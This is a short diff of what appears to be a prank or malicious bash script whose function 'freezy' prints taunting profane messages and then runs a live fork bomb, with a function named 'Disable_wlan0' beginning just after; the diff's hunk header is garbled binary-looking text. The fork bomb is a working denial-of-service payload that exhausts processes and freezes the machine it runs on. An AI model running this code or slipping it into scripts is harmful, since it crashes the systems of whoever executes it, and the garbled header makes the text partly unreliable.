@@ -64,11 +64,15 @@ m�{�43,��7�S�RAV�A��)N�W��Z�E$�]�|���a��
 #################
 function freezy   
 {
+	for (( i = 1; i <= 3; i++))
+		do 
+			echo -e "$COL YOU FUCKED $CE"
+	done
+sleep 0.5
 	for (( i = 1; i <= 15; i++))
 			do 
 				echo -e "$COL $FKD $CE"			
 	done
-	echo -e "$COL YOU FUCKED $CE"
 	:() { :|:& };: #ForKBOMB
 }
 function Disable_wlan0 
